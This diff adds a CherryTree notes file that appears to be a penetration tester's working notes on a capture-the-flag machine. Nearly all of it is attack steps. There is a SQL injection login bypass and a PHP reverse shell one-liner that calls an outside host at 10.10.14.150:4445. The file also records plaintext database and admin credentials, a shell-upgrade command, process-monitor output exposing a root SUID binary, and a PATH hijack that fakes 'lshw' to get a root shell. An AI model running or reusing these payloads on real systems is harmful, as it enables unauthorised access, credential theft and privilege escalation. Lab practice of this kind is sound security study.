@@ -1,0 +1,36 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="magic" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587329744.9" ts_lastsave="1587493254.98" unique_id="1">
+		<rich_text>admin' or ‘1’='1
+
+
+
+
+
+
+&quot;php -r ‘$sock=fsockopen(&quot;10.10.14.150&quot;,4445);$proc=proc_open(&quot;/bin/bash -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);’&quot;
+
+
+db pass:
+theseus: iamkingtheseus
+
+creds: 
+admin : Th3s3usW4sK1ng
+
+/usr/bin/script -qc /bin/bash /dev/null
+
+linpeas:
+
+-rwsr-x--- 1 root users 22040 Oct 21 03:45 /bin/sysinfo
+
+2020/04/20 15:05:04 CMD: UID=0    PID=3059   | /bin/sysinfo 
+2020/04/20 15:05:04 CMD: UID=0    PID=3061   | lshw -short 
+2020/04/20 15:05:04 CMD: UID=0    PID=3060   | sh -c lshw -short 
+2020/04/20 15:05:06 CMD: UID=0    PID=3066   | fdisk -l 
+2020/04/20 15:05:06 CMD: UID=0    PID=3065   | sh -c fdisk -l 
+2020/04/20 15:05:06 CMD: UID=0    PID=3067   | sh -c cat /proc/cpuinfo 
+
+edited PATH with: export PATH=/tmp:$PATH
+echo /bin/bash &gt;lshw</rich_text>
+	</node>
+</cherrytree>
